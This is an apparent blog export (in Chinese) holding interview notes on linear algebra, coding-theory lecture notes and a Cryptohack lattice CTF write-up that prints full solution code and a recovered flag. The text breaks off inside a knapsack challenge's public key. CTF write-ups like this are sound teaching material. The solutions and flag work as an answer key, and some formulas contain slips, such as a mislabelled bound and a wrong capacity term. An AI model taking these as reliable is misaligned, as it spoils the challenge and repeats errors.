proof","slug":"Zero-knowledge-proof","permalink":"https://archer-baiyi.github.io/en/tags/Zero-knowledge-proof/"},{"name":"ZKP","slug":"ZKP","permalink":"https://archer-baiyi.github.io/en/tags/ZKP/"}]},{"title":"华为 wireless terminal chipset research lab 面试","slug":"杂/华为-wireless-terminal-chipset-research-lab-面试","date":"2025-07-01T17:55:53.000Z","updated":"2025-07-01T19:10:16.200Z","comments":true,"path":"2025/07/01/杂/华为-wireless-terminal-chipset-research-lab-面试/","permalink":"https://archer-baiyi.github.io/en/2025/07/01/%E6%9D%82/%E5%8D%8E%E4%B8%BA-wireless-terminal-chipset-research-lab-%E9%9D%A2%E8%AF%95/","excerpt":"","text":"简单记录一下今天面试问到的问题以及正确答案。基本上全是在问Linear Algebra的各种问题。不过有一点我没有想到的是，他们居然会让我讲我的论文以及CTF比赛的内容。（当然，论文的部分跟我预想的一样，他们应该只听懂了introduction的部分。毕竟这东西实在是太纯数了点，基本上没有任何实际应用。） 1. 怎么样可以快速确定一个矩阵的秩（rank）？（假设$A \\in \\mathbb{R}^{m \\times n}$） 高斯消元法（Gauss Elimination） 秩为非零行的数量 不够稳定，因为会做除法。但如果只希望求秩的话则不需要考虑这个问题。 复杂度：$\\mathcal{O}(n^3)$ QR分解（QR Decomposition）： A = QR$Q \\in \\mathbb{R}^{m \\times m}$是正交（orthogonal）矩阵，$R \\in \\mathbb{R}^{m \\times n}$是上三角矩阵。 秩为R的非零对角元素个数（non-zero diagonal entries） 相对稳定 复杂度：$\\mathcal{O}(n^3)$ SVD分解（SVD Decomposition）： A = U\\Sigma V^T$U \\in \\mathbb{R}^{m \\times m}$是列正交矩阵（左奇异向量），$V \\in \\mathbb{R}^{n \\times n}$是列正交矩阵（右奇异向量），$\\Sigma \\in \\mathbb{R}^{m \\times n}$是对角矩阵，对角线元素是非负实数，为奇异值（Singular Values）。 秩为非零奇异值的个数 非常稳定。 复杂度：$\\mathcal{O}(n^3)$ 注意，他们的理论复杂度是一样的，但是常数项是不同的，所以在实际应用中，高斯是最快的，其次是QR分解，最后才是SVD分解。 2. 将这个问题建模并解决它：假设现在有n个物品（有不同的大小），并且有很多种不同大小的盒子，每个盒子里，只要大小允许，就可以放多个物品。我们希望minimize最后的盒子的数量以及多余的空间。 不会。 3. 一个矩阵在什么情况下会不存在特征值？ 对于实数矩阵来说，当它的characteristic function在$\\mathbb{R}$上没有根，那么它就没有特征值。比如说 A = \\begin{bmatrix} 0 & 1 \\\\ -1 & 0 \\end{bmatrix}characteristic function： \\det(A - \\lambda I) = \\begin{vmatrix} -\\lambda & 1 \\\\ -1 & -\\lambda \\end{vmatrix} = (-\\lambda)(-\\lambda) - (1)(-1) = \\lambda^2 + 1 = 0 \\Rightarrow \\lambda = \\pm i而对于复数矩阵来说，它们永远都会有特征值，因为$\\mathbb{C}$是complete的，所以它的characteristic function在$\\mathbb{C}$一定有根。 他们还问了一个least square相关的，但我从来没有听过那个词。我记得是least square前面跟了一个什么单词，但我没查到是什么。","categories":[{"name":"杂","slug":"杂","permalink":"https://archer-baiyi.github.io/en/categories/%E6%9D%82/"}],"tags":[{"name":"华为","slug":"华为","permalink":"https://archer-baiyi.github.io/en/tags/%E5%8D%8E%E4%B8%BA/"},{"name":"面试","slug":"面试","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"Coding Theory 编码理论","slug":"TUM  数学 笔记/Coding Theory 编码理论/Coding-Theory-编码理论","date":"2025-06-30T14:00:20.000Z","updated":"2025-09-27T08:00:16.705Z","comments":true,"path":"2025/06/30/TUM  数学 笔记/Coding Theory 编码理论/Coding-Theory-编码理论/","permalink":"https://archer-baiyi.github.io/en/2025/06/30/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/Coding%20Theory%20%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/","excerpt":"编码理论相关笔记","text":"基础Shannon’s Theorem 香农理论考虑一个binary symmetric channel，其中每一位传输错误的概率为$p$。记$q := 1-p$。 假设$C$是一个长度为$n$,包含$M$个词（$x_1,…,x_M$）的code。设$P_i$为$x_i$被错误解码的概率， P_C := \\frac{1}{M}\\sum^M_{i=1}P_i以及 P^*(M,n,p) := \\underset{\\text{all possible codes }C}{\\text{min}} P_CDefinition:The channel capacity $C(p)$ of a binary symmetric channel is defined as:\\begin{align*}C(p) &:= 1 + p \\, \\text{log}_2(p)+ q \\,\\text{log}_2(p) \\\\&=1 + p \\, \\text{log}_2(p)+ (1-p) \\, \\text{log}_2(1-p)\\end{align*} Theorem (Shannon’s Theorem 香农定理):Let$C(p)$ be the channel capacity. If $0 &lt; R &lt; C(p)$ and $M_n := 2^{\\lfloor Rn \\rfloor}$, then\\underset{n \\to \\infty}{\\text{lim}}P^*(M_n,n,p) = 0. 首先R其实表示的是目前编码的传输效率，因为当传输n位的信息时，其中只有$\\text{log}_2(M)$位是真的有效信息。 所以可以这样理解Shannon’s Theorem 香农定理： 对于每个频道（Channel）来说，$C(p)$是其传输效率（R）的上限。 注意到，当$p=0.5$时，$C(p) = 1 + \\text{log}_2(0.5) = 1-1 = 0$ 。也就是说，当传输时每一位的准确率都是纯随机的时候，不存在任何编码使得我们可以正确地传输数据。 Bounds/界限Singleton BoundTheorem:Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ linear code. Then,d_H(C) \\leq n-k+1. MDS CodeDefinition:A code that achieves the Singleton bound is called a maximum distance separable (MDS) code. Hamming boundTheorem (Hamming bound):Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ linear code with $d_H(C) \\geq d$ and let $t = \\lfloor \\frac{d-1}{2} \\rfloor$. Then,|C| \\leq \\frac{q^n}{V_H(t,n,q)}Equivalently,\\begin{align*}q^k &\\leq \\frac{q^n}{V_H(t,n,q)}\\\\\\Leftrightarrow q^{n-k} &\\geq V_H(t,n,q)\\\\\\Leftrightarrow q^{n-k} &\\geq \\sum^t_{i=0}\\binom{n}{i}(q-1)^i\\\\\\end{align*} Perfect CodeDefinition:Let $q$ be a prime power and $k \\leq n$ be positive integers. An $[n,k,d]_q$ linear code $C$ withq^{n-k} = V_H(\\lfloor \\frac{d-1}{2} \\rfloor,n,q),i.e. achieves the Hamming bound, is called a perfect code Definition （Hamming Code）:Let $q$ be a prime power and $r \\geq 2$ be a positive integer. Let $n = \\frac{q^r-1}{q-1}$ and $H$ be the $r \\times n$ matrix having as columns all vectors in $\\mathbb{F}^r_q$ up to non-zero scalar multiples. Then $\\mathcal{C} = \\text{ker}(H^T)$ is called Hamming code. Lemma:Let $q$ be a prime power and $r \\geq 2$ be a positive integer and set $n = \\frac{q^r-1}{q-1}$. The $[n,n-r]_q$ Hamming code has $d_H(\\mathcal{C}) = 3$ and is perfect. Gilbert-Varshamov BoundLet $A(d,n,q)$ be the largest size of any code (also non-linear) in $\\mathbb{F}^n_q$ with minimum distance at least $d$. Theorem (Hamming bound):Let $q$ be a prime power and $n,d$ be positive integers. Then,A(d,n,q) \\geq \\frac{q^n}{V_H(d-1,n,q)} Plotkin BoundTheorem (Plotkin Bound):Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ non-degenerate linear code. Then,d_H(C) \\leq \\frac{|C|}{|C|-1}n\\frac{q-1}{q}. The simplex code achieves this Plotkin Bound.","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"Coding Theory 编码理论","slug":"TUM-数学-笔记/Coding-Theory-编码理论","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"}],"tags":[{"name":"编码理论","slug":"编码理论","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"Coding Theory","slug":"Coding-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Coding-Theory/"}]},{"title":"Cryptohack Lattices Writeup","slug":"CTF/Crypto/Cryptohack-Lattices-Writeup","date":"2025-06-28T12:51:22.000Z","updated":"2025-06-28T20:00:53.379Z","comments":true,"path":"2025/06/28/CTF/Crypto/Cryptohack-Lattices-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/28/CTF/Crypto/Cryptohack-Lattices-Writeup/","excerpt":"","text":"LatticesVectors 1702 Size and Basis \\sqrt{4^2 + 6^2+2^2+5^2} = 919 Gram Schmidt 12345678910111213141516171819202122232425262728import numpy as np# 给定的基向量v1 = np.array([4, 1, 3, -1], dtype=float)v2 = np.array([2, 1, -3, 4], dtype=float)v3 = np.array([1, 0, -2, 7], dtype=float)v4 = np.array([6, 2, 9, -5], dtype=float)vectors = [v1, v2, v3, v4]# Gram-Schmidt 正交化过程def gram_schmidt(vectors): orthogonal_basis = [] for v in vectors: u = v.copy() for b in orthogonal_basis: proj = np.dot(v, b) / np.dot(b, b) * b u -= proj orthogonal_basis.append(u) return orthogonal_basis# 执行 Gram-Schmidt 算法orthogonal_basis = gram_schmidt(vectors)# 提取 u4 的第二个分量并保留 5 位有效数字u4 = orthogonal_basis[3]second_component = float(f&quot;&#123;u4[1]:.5g&#125;&quot;)print(&quot;Second component of u4 (5 sig. fig.):&quot;, second_component)# Second component of u4 (5 sig. fig.): 0.91611 What’s a Lattice? 1234567891011121314import numpy as np# 基向量作为矩阵的行A = np.array([ [6, 2, -3], [5, 1, 4], [2, 7, 1]])# 计算体积，即行列式的绝对值volume = abs(np.linalg.det(A))volume_rounded = round(volume)print(&quot;Rounded volume:&quot;, volume_rounded)# Rounded volume: 255 Gaussian Reduction Find the Lattice题 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, inverse, bytes_to_longimport randomimport mathFLAG = b&#x27;crypto&#123;?????????????????????&#125;&#x27;def gen_key(): q = getPrime(512) upper_bound = int(math.sqrt(q // 2)) lower_bound = int(math.sqrt(q // 4)) f = random.randint(2, upper_bound) while True: g = random.randint(lower_bound, upper_bound) if math.gcd(f, g) == 1: break h = (inverse(f, q)*g) % q # h = f^&#123;-1&#125; * g mod q return (q, h), (f, g)def encrypt(q, h, m): assert m &lt; int(math.sqrt(q // 2)) r = random.randint(2, int(math.sqrt(q // 2))) e = (r*h + m) % q return edef decrypt(q, h, f, g, e): a = (f*e) % q m = (a*inverse(f, g)) % g return mpublic, private = gen_key()q, h = publicf, g = privatem = bytes_to_long(FLAG)e = encrypt(q, h, m)print(f&#x27;Public key: &#123;(q,h)&#125;&#x27;)print(f&#x27;Encrypted Flag: &#123;e&#125;&#x27;) 123Public key: (7638232120454925879231554234011842347641017888219021175304217358715878636183252433454896490677496516149889316745664606749499241420160898019203925115292257, 2163268902194560093843693572170199707501787797497998463462129592239973581462651622978282637513865274199374452805292639586264791317439029535926401109074800)Encrypted Flag: 5605696495253720664142881956908624307570671858477482119657436163663663844731169035682344974286379049123733356009125671924280312532755241162267269123486523 解我们先来看一下它原本的整个加解密过程： 首先会生成一个大素数$q$，然后会生成互质的$f,g$ 满足： \\begin{align*} 2 < &f < \\sqrt{\\frac{q}{2}}, \\\\ \\sqrt{\\frac{q}{4}} < &g < \\sqrt{\\frac{q}{2}} \\end{align*}以及计算一个$h$： h = f^{-1} \\cdot g \\quad \\text{mod } q.加密过程： 首先确保 m \\leq \\sqrt{\\frac{q}{2}},然后生成一个r满足 2 < r < \\sqrt{\\frac{q}{2}}并计算 \\begin{align*} e &= r \\cdot h + m &\\text{mod } q \\\\ &= r \\cdot f^{-1} \\cdot g + m &\\text{mod } q \\end{align*}解密过程： 计算 \\begin{align*} a &= f \\cdot e &\\text{mod } q \\\\ &= f \\cdot (r \\cdot f^{-1} \\cdot g + m) &\\text{mod } q \\\\ &= rg + fm &\\text{mod } q \\end{align*} m = a \\cdot f^{-1} \\quad \\text{mod } g注意，由于我们一开始给定的取值范围，我们有 rg + fm < q所以有 m = (rg + fm) \\cdot f^{-1} = m \\quad \\text{mod } g也就是说确实可以还原出原本的消息。（在这道题里，我们忽略$m &gt; g$的情况。） 那么该如何把这个问题转换成Lattice的问题呢？ 注意到 \\begin{align*} h &\\equiv f^{-1} \\cdot g \\quad \\text{mod } q \\\\ \\Longleftrightarrow \\quad g &\\equiv fh \\quad \\text{mod } q \\\\ \\Longleftrightarrow \\quad g &= fh + kq \\\\ \\Longleftrightarrow \\quad (g,f) &= (fh + kq,f) \\\\ \\Longleftrightarrow \\quad (g,f) &= f(h,1) + k(q,0) \\end{align*}对于某个$k \\in \\mathbb{Z}$. 也就是说，对于给定的$q,h$，一对整数$(x,y)$满足 x \\equiv yh \\quad \\text{mod }q当且仅当$(x,y)$属于下面这个Lattice： \\mathcal{L} := \\left\\langle (q, 0), (h, 1) \\right\\rangle = \\left\\{ a(q, 0) + b(h, 1) \\mid a, b \\in \\mathbb{Z} \\right\\}.假设$(x,y)$是这个Lattice$\\mathcal{L}$的一个点，不难发现，对于这道题里的$h,q$的值来说有 ||(f,g)||_2^2 < q \\leq ||(x,y)||_2^2所有我们现在便将问题转化成了找这个Lattice \\mathcal{L} := \\left\\langle (q, 0), (h, 1) \\right\\rangle = \\left\\{ a(q, 0) + b(h, 1) \\mid a, b \\in \\mathbb{Z} \\right\\}.里的最短向量。而这个问题可以用Gaussian reduction很高效地解决。 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from math import isqrtfrom Crypto.Util.number import inverse, long_to_bytesq = 7638232120454925879231554234011842347641017888219021175304217358715878636183252433454896490677496516149889316745664606749499241420160898019203925115292257h = 2163268902194560093843693572170199707501787797497998463462129592239973581462651622978282637513865274199374452805292639586264791317439029535926401109074800e = 5605696495253720664142881956908624307570671858477482119657436163663663844731169035682344974286379049123733356009125671924280312532755241162267269123486523# ==== 1) 高斯二维格子化简 ====def gaussian_reduction(v1, v2): &quot;&quot;&quot; 输入: v1, v2 为二维整数元组 (x, y) 返回: (u1, u2) 为高斯化简后的一对基向量 ——u1 是格子最短向量 (或其符号) &quot;&quot;&quot; # 把向量改成可修改的列表 v1 = list(v1) v2 = list(v2) # 循环直到触发 (c) 返回 while True: # (a) 若 |v2| &lt; |v1| 就交换 if v2[0] ** 2 + v2[1] ** 2 &lt; v1[0] ** 2 + v1[1] ** 2: v1, v2 = v2, v1 # (b) m = ⌊ v1·v2 / v1·v1 ⌉ —— 四舍五入最近整数 dot12 = v1[0] * v2[0] + v1[1] * v2[1] dot11 = v1[0] * v1[0] + v1[1] * v1[1] m = round(dot12 / dot11) # (c) 如果 m == 0 说明无法再缩短，返回 if m == 0: return tuple(v1), tuple(v2) # (d) v2 = v2 − m·v1 v2[0] -= m * v1[0] v2[1] -= m * v1[1]# 基向量 (q,0)、(h,1)b1 = (q, 0)b2 = (h, 1)u1, u2 = gaussian_reduction(b1, b2) # u1 就是最短向量，形如 (g, f)g, f = u1 # 注意顺序是 (g, f)# ==== 2) 解密 ====bound = isqrt(q // 2) # 题目的 “√(q/2)” 限制assert abs(f) &lt; bound and abs(g) &lt; bound, &quot;没找到合格的最短向量！&quot;f_inv_mod_g = inverse(f % abs(g), abs(g))m = (f * e % q) * f_inv_mod_g % abs(g)flag = long_to_bytes(m)print(flag)# b&#x27;crypto&#123;Gauss_lattice_attack!&#125;&#x27; Backpack Cryptography题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import randomfrom collections import namedtupleimport gmpy2from Crypto.Util.number import isPrime, bytes_to_long, inverse, long_to_bytesFLAG = b&#x27;crypto&#123;??????????????????????????&#125;&#x27;PrivateKey = namedtuple(&quot;PrivateKey&quot;, [&#x27;b&#x27;, &#x27;r&#x27;, &#x27;q&#x27;])def gen_private_key(size): s = 10000 b = [] for _ in range(size): ai = random.randint(s + 1, 2 * s) assert ai &gt; sum(b) b.append(ai) s += ai while True: q = random.randint(2 * s, 32 * s) if isPrime(q): break r = random.randint(s, q) assert q &gt; sum(b) assert gmpy2.gcd(q,r) == 1 return PrivateKey(b, r, q)def gen_public_key(private_key: PrivateKey): a = [] for x in private_key.b: a.append((private_key.r * x) % private_key.q) return adef encrypt(msg, public_key): assert len(msg) * 8 &lt;= len(public_key) ct = 0 msg = bytes_to_long(msg) for bi in public_key: ct += (msg &amp; 1) * bi msg &gt;&gt;= 1 return ctdef decrypt(ct, private_key: PrivateKey): ct = inverse(private_key.r, private_key.q) * ct % private_key.q msg = 0 for i in range(len(private_key.b) - 1, -1, -1): if ct &gt;= private_key.b[i]: msg |= 1 &lt;&lt; i ct -= private_key.b[i] return long_to_bytes(msg)private_key = gen_private_key(len(FLAG) * 8)public_key = gen_public_key(private_key)encrypted = encrypt(FLAG, public_key)decrypted = decrypt(encrypted, private_key)assert decrypted == FLAGprint(f&#x27;Public key: &#123;public_key&#125;&#x27;)print(f&#x27;Encrypted Flag: &#123;encrypted&#125;&#x27;) 12Public key: [260288377891444370372615148009023640057294926547602419331406531383682223097787288755377467188515435381259752760746, 322734358011758862401399370931929863052553602421714393280581187496537763321855751120439457234561080720455397490349, 88092359256403564783665281993130133541226601877969436905267415353041909757324746080398461245281826552421872983184, 601684701300110945921036937572461050140352984401874675917155063594305583314408001377505387079690115000992094388032, 193814643850628739958152744041743058858484088269609293429408490294552345005365776962194365813796130165113184925621, 51510606914703888409341761261103125433754505248101513818740574350196563260563818621033222936301769697693287778876, 502702742677974540308798846750017003106263447846689040491266463798703222616320168069962523670400796196343460832764, 86989835783586738140883150201327374176124588410464188692884973334241681514702306716383785095564084499563152815246, 515511378187957676256419959601984383408150348796281656976955880729383340611785836962788715725367023923811376366815, 119845178983025037005174732553931706284024826223176718982111213579707091766057320315419827781508690979405126062061, 207867794910968434026003881920029657224591376925067493713968219177352819759854486838459675245909787840416982457750, 239399986603216503029402544900610984881160101923294396792665204486222975420081300661354603175384772323551980155480, 306665236132315336961576566094908486196981556971172170145299174389720334940261512384837950321772782983903454058725, 558130280550827068212352576387713811027468233905173944680355562037815257403446113128895937326412940859588204361963, 123471925832174980344066571541132411467266736109103860421447462536930482316849470378251137263190870093702164003085, 146089706629012142384661350988216882483919264673129621404831339166566056469572087759748854086023354002641923689390, 446097892684389219719742914373867457099954499449824602532333181169038249081395758983133906564840000962001976506057, 204029934276059225352901134714823317920576872465404508059719045291560482057171052793698580294637069578017200124432, 412333373143000457741307988470055504576675151299345387733692618218275177027643785881042018546460452418506341967356, 171418413940299360322712423004114364681865276057786947919043883366302567169869592290151559269290446563185553350080, 401593473337411114258578268223784182795068785564101722335215736591292301602077751376477881087346810602041717163104, 204003688543820354337113938494979311981574571424756883928855286926734578790400322291262042466654212377708831289347, 555612926496986208337317871061684502803594375654879680702581403987248292734014139717756900004905653768133795128973, 462785612281910846822645629160953231999037081137615204334672445418078665808070086646804794186256411131615189487813, 77961961618173276050791733447969083544152711482614563228085622136316525792569658878271751219358260960116292497570, 517789370221435419776588087490678991824021927945387533283088388790482913301281733115458601414668206432512998904516, 281870328340314395150658482932699114581743200279996227099530744754750289102031518563761975024621347281374162044877, 60204977937304337797770029325498234132893935850995809547662640467737007197647697381430963693698522962733473746281, 395936787836195675178388359277761575381601972138693830435288611414489963379399027975388601714741876831895709497105, 90921357930302550361827901642067284191268695594120415817202534786924330392421221829361546010764453051928814876700, 238523907687908075601117120608130752369082206676107364350347208286323115036939777325067473364465438898353765093766, 277515010021988996116595000889051160811249034599876556819610707794016612800585201793339332495839495779526504613846, 187215937497318890199135284983515062319988136636108170852591598862524363777870331888216170582220867500042557737272, 411220029331367081136918789112083235781237730079305782620378994961505282090962448446931628731751970521853108685376, 433613620456520979627974441205441942311133790647897226320388205340695256818608765746266662314499649013982035729731, 509613591091334719216567967380183602959933686617275815879939870258332674755345348802452058256788513837941126219238, 352708166022264045150842358964512080203788453464883319778517822047480718640858804837886057264514786742694419419735, 486272357335492500753956372299255798603575392697018451800774427752724312455328655650777691830508441976819499348269, 1291533249748053824342851185451970324561531056195308125673915619130780992270420765078102812914222570167615953050, 520707501920546816250915326019351261090208813534492143136485743644939372232638461802625700978801768541842624647274, 272359456788721692618768612190222453304838934916628492701462591276450281926223118982602858211688086607842351391495, 119534191144397164327417397593964021477488683311215644770010641745736480039094209273092223959694752862193314087240, 394945131470603614379767959704654538029557537489316246092982427107641617479545488843535929537498546432123287486437, 395979428475608101765230328218274625986674115712051764903732593018454264017781340199795540039285257513438842708672, 322101629493887220159199019582810892418957941946300752245249462093036697035162212557261470168522953435341905295650, 60610073299031334532969727880668989046838926047395613981473675505442500833244137863225398782029541439420403686372, 492582431835005621441922899995666806499437611069193099072247918597047415020628078410849119945608854080040163699375, 356290614124448077864884136922409291617128370298210212357882465167338600485728936925448944675136056707929560080237, 469737185578879122378016959759297464132272432425745272107998534197014940235018335349886398896979254122985841196030, 522871107234918024128768136315123497251902274681110489386594944387181296826024289163431880961506314580935567743910, 407151723612481391724375429193917289623669496278028982297086458062111012958436324350527302865535766565677711383191, 597354385774970715448797740483856119139152021834911852144490298736330354118482480147237280491305029710326837274157, 541106433608213985607913120402276000940203625086988929757276286018099336445558864548353610869729642196223750468493, 417269959280528548156948994397262973057821055108288565091113745409730174626359955737489143948177504667498654245449, 165844467199853002181647516786815801413939363188955720855463610698066730208657222822269457713666541555820608908443, 54875733171006797537647859403084623422036246809497621662400918381496284440644503330411668895858884933248328986102, 465819050441857934210906305127374377291850450707906416261994960542649394393702032587209990932960399224341143990297, 369322923825463715724411404444452360125845865658673947242361968271863944079047696087621731311243573179527276498509, 553158781749591211954659671173145767949897795287325677938373702443265138456771264711232588438786042792968904732769, 409812013938165700887519758386718364160025926340003407045361393371862966914817952304595560620453598830906305966865, 494654868138757552768371639418237489264099471894419220273147503624077564865563661914136003656825657044284503346448, 583613295252460993144403074130901622751986348055784728175987246652496523293580989652454868505577305787293683850652, 45623098408168398769971239387495928980835555721564847009059790575158770295430426790200773274288087331109699336204, 39196430635656777174378129146834600960125068266405306877726260536750371354188413207203531511343645151492477471286, 269811462520469960288594953357779332541515563494806499705455036716689694055741096626927182558039773813984145657639, 56129158162087034209035841739296133948708529713411817898928727109770418208078239244331640522507423413446203417794, 524210107239750288249530336771864024916995632570549267972428294539507299820629133801771958736839361325798918246415, 74499040113803277306263886217659673645883223840279171192334357737741618882160648968176974754905084576184804774369, 537566085689080717108870646705458338163437075433046077845999622035879463636776663759447985884960181167857417860517, 67053890181708018909161683393261532526993578729770554741021482840348299866927821016301415949708659944497709907470, 226687291544149270579995169198961617407190234578516732237756117257869929434434889879973211444301745820066870869034, 30119130560797352224094299766590747178156378314088092947830899847927767559391822485618397327733723834195435500170, 273554685078063587415670757725663508130498751998110442807136494763920302805098071555958936900406570453984774374060, 87980277743580170573607118853300224477595233902389343863665172738347967268089655736029345194767280704236057718111, 415325115863346791298232938393411393462777451386243842830553121689594926353646948497680883539360608323603975987452, 291860381996369849963997875749710331697722876276851205203280910491894467229365951220031470367159168511107680106262, 554653569462940342418063467925252548314485118886100002832290030505991378878498660088540140703141291011055029173137, 323189774384600834625013268084915768916855209746568551595158521873406091567687194674213765428238599317205811518692, 271805885895959097314720980134407607645324820417975238169874050425279962478579515969226563851125481000349196674810, 273580504244152469063405670227951980303621824057876058884978331188257821496852334599050020207990127348359965113465, 89994080154200685717636930068317931325931168723237899144166312528962957042842197915530047017893088501681215899095, 179903529806043505032581494908566846659773117049401056767669943330229935007822437549131470977810261112485254094386, 337553339737054880017288314951575451797426862530219763936855885416298554494199226261714888518914541341927073075939, 55576723594346882914517616915509260915444308762551400560217462518909289055446940809390878002725822401595827206530, 16748220768196858904499918524709172735166549515085689048938405549141121222201553686060172878474455615920723669801, 317380564633191615800168658676142557493413060315417096622564923156521630376263849705099633192226251101432134441153, 533990888376667129575141849433166253104032964155895368357797314378260092470904627861359175864364684662961150582207, 51339665999563119517609216115086272052501396280925354694804471629521639434841281422984348587180771099209184749005, 598751671521816401429095343374521592165563401213195481604556405443389323390172923217639290327197434030974530635632, 502516418942980462174586089858060912235797554801782186782319843655355616321036648106166017773986280053024012403712, 96757697084956246010025820107260538706827163135748809142998937362457169471061108292297066769079020843197361323396, 160715027762704553320571142674023737670353756130518440136900430091151963142004047232920245715827837173811719927140, 279138292123840748082780689543574043699162822819208361733228093396335579794292477744981338016264347327181324984710, 76445842054689324523514421681098261857514827631364695255959418519245612571199123499205752729124353901548286671941, 383675319414133753635121914615218464358220814208747712016103562476157464944897131756675168140846189629485664787044, 260741648290568813857849033448155840373964568801980310694295413631289231242930901519918814851819352903132884286000, 572815144956474380133620797676157654285774633299428534205241845335783095326631133195133798583360396067031309578073, 326258465939147178368353573060965288327891986807699582822092415027094204965326681853802159504539722937811913340954, 270266570242986488258809014590807152136633692716132669770748395523214017062557603428657196661342410476403164567952, 594635668324174018778140793057815156885870465660609865234586849536688338135131804764199647040009222634146148815637, 112066852946512058163194024984815176069074331367673763590415760757313750687675218022751871678411881684718198988959, 72643140251973593561700085821570131390914743121754868577502110904091989089708201436984242838820806097191225214858, 418558767829526524235103555737958351573183096833081038769308995724925326439890724874671213539641031754157727776067, 196559288823369030489094238610617412012659194878611686482089456487889879135369906410569754176462601644487717691079, 484475844260869041475828428835126624027291693283800645559775410528136122290210564467730445814182429120097372738911, 397895531572254423225385975618860549078025992059379971480526615942245245283818149065605766495091059477544617632303, 173098235745543952336517747078283517802667869630628062474315240281111485771833849083340162673485620557610425012773, 395438744730241817782361196255681827924847041028664896503460681041226871979986416514203189980456170013127549062319, 470021990867207717347003710359490169212637212255796418181420825247262094876084196634243149241752002339736588912053, 116393009019558569654503508922282193810180596603376432764270301486325221610807518426481578453602546466299515294456, 312679236344738874814229979243462639486594453393064312671149009880980836289564409215088541509970023077739205203468, 125633612607015147027292740679836345332097512816636698981581758992992116056276272361001165705597842757882238693825, 550545747650576990464265884382499274254872311986381675090751886824037811235625095205217845451891396561893492715391, 582344947379262203945082609921047126789902458640974947174265099323728700596079597139164883619347159500887293859913, 597445807393853093495564866081359122814348105478914638258595339515168987499771664924728981250079847198831836930965, 203086100710322798737771097067197649738932976573837729229038404179992238381339090779534246758253939763462200026384, 366083021996787911206272856169665720981308167177143125303074466648545813452157612764258146407782634619278092168081, 568425067761875823198893591966757461338470700675615033946429149483970138055665377562238998722395767377075284081587, 292063178202410186631443519138674436645163233411161937085629856088259050827382985093506892763617302007759121037731, 572237520943575841301998365238940412928982617335768155394691567092595694943290938278464533099223273214233507106207, 130730938892686892107630262721901246969052318133502728671984157629171554435251506312878040499761922665301495030981, 185117108148352276973404708807613996548096583954940273525781406848525491758486946236965943611210198389159091280333, 37060990092986925132287820152354618271473589014825595897838753632315007172710154561879917551705194656825456571032, 403396730776194870459199627544122636010870768257463359235766775533882938128146112838489577777497432203020030499998, 390519053219213422305599109947414047895590808796368085342860468917268018310638864392199371679272174634278410878307, 128444781947873592602609418783055715736876557725608932301613294446934930933474014020041434831899064316552264614235, 543291373538613455155809248493830432520680330961337677793905220928838352322514565851452650441518480234729892153780, 488514444383813071753894478409325136755661751625837651637348989332739608743318097848609715931362718450900659714726, 345584582429475420526208382863826459005483455209655712636957752389218040279848223862500232738960994712140028026289, 93010878843154734421543561265196548806562081923037074596459052686633775723171466088126269822057315393084026072218, 12533412965882925987419497258660569237455714460582608620237638858642686843645624645184949324869641399446820464020, 562770032030414047557952904910126027215456025343530350248616818594366525600180778011275466074764589844321872364272, 128451705070871056157396910591766296038989235798264982434769256144115712608648937222298167066517556774062311420353, 490278961434267039693706795888817653385586689501848271165345121922956317504140732421546020494675482464550410472502, 212287543946551782522399704940695532581109453008804375002654843122502975490312129477869621998080277682674199046031, 351228167329138957128592454766411142609836239330479331051630155591459798299725613134325016512314887321869487481161, 364056580106158102895694571253671943571916920885795142960090311722444269241247963009814588199874030295862636577768, 323410613174912128865174768949092780979646178505039555025194364419990442219941948707117457621400459111231556621585, 555979459475319018276106133189578589964687373772995549423813902773304274184448885651570001083614054140692063026580, 471645896888183848879918063770091917659270906648819201901346651975957177950753583099047587304484006413716362087065, 595746107902898270905714635379070716651708771264047581902664532594897071557252807014533004074458867603957329534516, 557816517693603351719661411054144374250247040672226934534604151399902780319198098821629853612396635344596388943480, 75653615683769023911143698869320584951015514055697266638646507368530841035631560833198288977975782471517557394092, 386729218862361591185009654369415880766336899946663823664818477204172007165198875809899277634660190797185025579614, 393108265477944240661308455550612796769200470498502703905073280606596277788078742986164286625262059483908055127428, 365065802583204450004435661912506592532468753723399406740663534070289404492293680764078659588454240436160849321237, 343474792575856700080726394177083134771079426798042359193966109700850531408037245425173307797050676647933775237484, 449270583610225180914452784540333562631570453995885992409935055758994173533991695282410200635020830187612444056607, 152477148608000973940085532267319492932629609199964217167273279315109403426434432473053141371160594251975646390787, 215758046810520029171417357963508549726865838830930981174495643955719506571398771447950049727234258305885220507020, 388644732079570479249894814593945177309689613386566508292336098907992239994635374799070003303374928382563877494312, 33174396496627497383579687586254392056231321534282758587681567913835717050445163816449882425899904436708697640574, 293328356964375951072242072976851267186828242468018707810599907336525314670450502681522283876131924077746023996643, 292804486280753504026674757794166015519590385505528937148184945726179320137391480944836180610675717906694042510411, 278315915715399524055936806996907092937794467054749462150463756152176847617395557111508306851465386462011262385630, 103884040577296119486012754822466682224025370872916939490159319500421058932999421365377738193002421767097172706341, 111463652129659874006915288174831654634146152513640366449316440114829594116719772451443937868409442532699879776869, 475152124260969797265060453354454799124845717445357239027249597786029156307488697633998763174770332805926500738683, 